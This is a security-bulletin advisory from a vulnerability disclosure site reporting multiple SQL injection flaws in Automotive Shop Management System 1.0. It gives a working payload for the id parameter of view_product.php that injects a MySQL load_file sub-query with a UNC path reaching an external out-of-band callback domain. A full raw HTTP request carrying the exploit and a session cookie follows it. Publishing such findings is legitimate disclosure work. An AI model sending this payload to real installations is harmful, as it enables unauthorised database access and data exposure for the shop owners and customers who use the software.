---
title: Automotive Shop Management System 1.0 Multiple SQLi
url: https://cxsecurity.com/issue/WLB-2026100005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-10-20
fetch_date: 2026-10-21T06:46:58.217864
---

# Automotive Shop Management System 1.0 Multiple SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Automotive Shop Management System 1.0 Multiple SQLi** **2026.10.20**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: Automotive Shop Management System 1.0 Multiple SQLi
# Author: nu11secur1ty
# Date: 10/19/26
# Vendor: https://github.com/oretnom23
# Software: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/2026/Automotive-Shop-Management-System-1.0
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The id parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\5gmsxuxam52jampd7vc6x0cvcmif681wszgq3gr5.oastify.com\\vip'))+' was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.
STATUS:
CRITICAL
[+]Payload:
```
GET /asms/products/view\_product.php?id=7'%2b(select%20load\_file('%5c%5c%5c%5c5gmsxuxam52jampd7vc6x0cvcmif681wszgq3gr5.oastify.com%5c%5cvip'))%2b' HTTP/1.1
Host: pwnedhost.com
Cache-Control: max-age=0
Sec-CH-UA: "Chromium";v="154", "Not;A=Brand";v="24", "Google Chrome";v="154"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: \*/\*
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=oh3navbdvii1gjgq93asvsks9q
X-Requested-With: XMLHttpRequest
Referer: https://pwnedhost.com/asms/?p=products
```
# Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/2026/Automotive-Shop-Management-System-1.0)
# Demo:
[href](https://odysee.com/@nu11secur1ty:b/Automotive-Shop-Management-System-1.0-Multiple-SQLi:e)
# Time spent:
00:47:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026100005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top